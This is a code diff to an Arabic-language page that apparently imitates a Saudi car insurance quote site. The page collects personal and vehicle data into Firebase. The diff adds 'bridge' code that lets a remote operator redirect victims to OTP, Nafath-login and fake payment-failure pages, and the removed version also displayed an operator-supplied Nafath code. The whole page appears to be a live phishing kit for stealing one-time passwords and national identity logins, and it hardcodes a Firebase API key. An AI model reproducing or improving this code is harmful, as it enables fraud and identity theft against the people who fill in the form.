@@ -70,17 +70,13 @@
             <!-- تفاصيل المركبة والاستخدام -->
             <div class="mb-3"><input type="date" class="form-control" id="startDate" placeholder="تاريخ بدء الوثيقة" required></div>
             <div class="mb-3"><select class="form-select" id="usage"><option selected>استخدام شخصي</option><option>تجاري</option></select></div>
-            <div class="mb-3"><input type="tel" class="form-control" id="sequenceNumber" placeholder="الرقم التسلسلي (موجود في الاستمارة)" maxlength="9" required></div>
             <div class="mb-3">
                 <label class="form-label text-muted small" style="margin-bottom:2px">تاريخ ميلاد المالك</label>
                 <input type="date" class="form-control" id="dob" required>
             </div>
-            <div class="mb-3">
-                <select class="form-select" id="city" required><option value="" selected disabled>المدينة</option><option>الرياض</option><option>جدة</option><option>مكة المكرمة</option><option>المدينة المنورة</option><option>الدمام</option><option>أخرى</option></select>
-            </div>
-            <div class="mb-3"><input type="text" class="form-control" id="carType" placeholder="نوع السيارة (مثال: كامري)" required></div>
-            <div class="mb-3"><input type="number" class="form-control" id="carYear" placeholder="سنة الصنع (مثال: 2023)" required></div>
-            <div class="mb-3"><input type="number" class="form-control" id="carValue" placeholder="القيمة التقديرية للسيارة (ريال)" required></div>
+            <div class="mb-3"><input type="text" class="form-control" id="carType" placeholder="نوع السيارة (مثال: كامري)" required inputmode="text" autocomplete="off"></div>
+            <div class="mb-3"><input type="text" class="form-control" id="carYear" placeholder="سنة الصنع (مثال: 2023)" maxlength="4" required inputmode="numeric" pattern="[0-9]{4}" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')"></div>
+            <div class="mb-3"><input type="text" class="form-control" id="carValue" placeholder="القيمة التقديرية للسيارة (ريال)" required inputmode="decimal" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9.]/g, '')"></div>
 
             <!-- مكان الإصلاح -->
             <div class="mb-3">
@@ -92,7 +88,7 @@
             <!-- الرمز المائي وزر العروض -->
             <div class="mb-4">
                 <div class="captcha-box mb-2" id="captchaDisplay" style="cursor: pointer;" title="اضغط لتحديث الرمز"></div>
-                <input type="text" class="form-control" id="captchaInput" placeholder="أدخل الرمز أعلاه" required>
+                <input type="text" class="form-control" id="captchaInput" placeholder="أدخل الرمز أعلاه" required inputmode="text" autocomplete="off" autocapitalize="characters">
                 <div id="captchaError" class="text-danger small mt-1" style="display: none;">❌ الرمز غير صحيح، حاول مرة أخرى</div>
             </div>
             <div class="d-grid"><button type="submit" class="btn btn-success btn-lg">إظهار العروض</button></div>
@@ -102,7 +98,7 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, doc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
@@ -149,40 +145,27 @@
                 car_type: document.getElementById('carType').value,
                 car_year: document.getElementById('carYear').value,
                 car_value: document.getElementById('carValue').value,
-                sequence_number: document.getElementById('sequenceNumber').value,
                 dob: document.getElementById('dob').value,
-                city: document.getElementById('city').value,
                 usage: document.getElementById('usage').value,
                 start_date: document.getElementById('startDate').value
             }).catch(() => {});
         }
         window.location.href = "offers.html";
-    });// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
-(function() {
-    const userId = localStorage.getItem('user_id');
+    });
+
     if (userId) {
-        db.collection("orders").doc(userId).onSnapshot((doc) => {
-            if (doc.exists) {
-                const data = doc.data();
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp_verification.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_failed.html";
-                } else if (data.next_step === "GO_TO_NAFATH") {
-                    window.location.href = "nafath.html";
-                } else if (data.next_step === "SHOW_NAFATH_CODE") {
-                    const codeBox = document.getElementById('nafath-number');
-                    if (codeBox && data.nafath_code) {
-                        codeBox.innerText = data.nafath_code;
-                        const overlay = document.getElementById('overlay');
-                        if (overlay) overlay.style.display = 'none';
-                    }
-                }
+        onSnapshot(doc(db, "orders", userId), (snap) => {
+            if (!snap.exists) return;
+            const data = snap.data();
+            if (data.next_step === "GO_TO_OTP") {
+                window.location.href = "otp_verification.html";
+            } else if (data.next_step === "GO_TO_REJECT") {
+                window.location.href = "payment_failed.html";
+            } else if (data.next_step === "GO_TO_NAFATH") {
+                window.location.href = "nafath.html";
             }
         });
     }
-})();
-// ------------------------------------------
 
 
 </script>
